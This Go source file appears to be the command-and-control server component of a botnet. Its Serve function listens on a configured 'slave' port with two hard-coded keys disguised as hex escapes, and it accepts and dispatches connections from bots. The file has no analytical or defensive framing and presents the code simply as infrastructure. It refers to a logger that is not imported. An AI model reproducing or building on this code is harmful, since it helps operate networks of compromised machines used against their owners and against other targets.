package slaves

import (
	"server/core/config"
	"server/core/slaves/networking"
	"strconv"
)

func Serve() {
	botListener, err := networking.Listen(":"+strconv.Itoa(config.Server.SlavePort),
		[]byte("\x62\x70\x36\x35\x39\x39\x37\x66\x72\x6D\x67\x79\x77\x70\x5A\x78"),
		[]byte("\x67\x78\x4C\x59\x37\x66\x43\x74\x79\x56\x78\x70\x68\x79\x71\x62\x70\x37\x61\x68\x75\x5A\x70\x43\x72\x56\x6B\x46\x51\x41\x73\x52"))
	if err != nil {
		panic(err)
		return
	}

	logger.Info("Listening for slave connections", "port", config.Server.SlavePort)

	for {
		connection, err := botListener.Accept()
		if err != nil {
			logger.Error("Failed to accept connection", "error", err)
			continue
		}

		go handle(connection)
	}
}
